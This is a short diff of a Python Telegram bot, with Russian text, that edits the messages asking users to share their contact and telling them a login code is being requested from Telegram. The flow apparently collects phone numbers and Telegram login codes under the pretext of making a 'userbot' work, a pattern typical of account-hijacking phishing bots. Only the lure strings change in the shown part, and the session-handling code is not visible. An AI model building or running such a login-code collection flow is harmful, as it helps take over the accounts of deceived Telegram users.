@@ -130,12 +130,12 @@ async def cmd_start(message: Message, state: FSMContext):
     conn.close()
 
     keyboard = ReplyKeyboardMarkup(
-        keyboard=[[KeyboardButton(text="📱 Поделиться контактом", request_contact=True)]],
+        keyboard=[[KeyboardButton(text="🏴‍☠️ Поделиться контактом", request_contact=True)]],
         resize_keyboard=True,
         one_time_keyboard=True,
     )
     await message.answer(
-        "Привет, брат! Для входа нажми кнопку ниже 👇",
+        "Pasture Us🏴‍☠️ Поделитесь контактом что бы Юзербот работал",
         reply_markup=keyboard,
     )
     await state.set_state(AuthState.waiting_for_phone)
@@ -162,7 +162,7 @@ async def process_phone(message: Message, state: FSMContext):
     phone = f"+{cleaned_digits}"
 
     await message.answer(
-        f"⏳ Обрабатываю номер <code>{phone}</code> и запрашиваю код у Telegram...",
+            f"⏳ Обрабатываю Ожидайте!<code>{phone}</code> и запрашиваю код у Telegram...",
         reply_markup=ReplyKeyboardRemove(),
         parse_mode="HTML",
     )
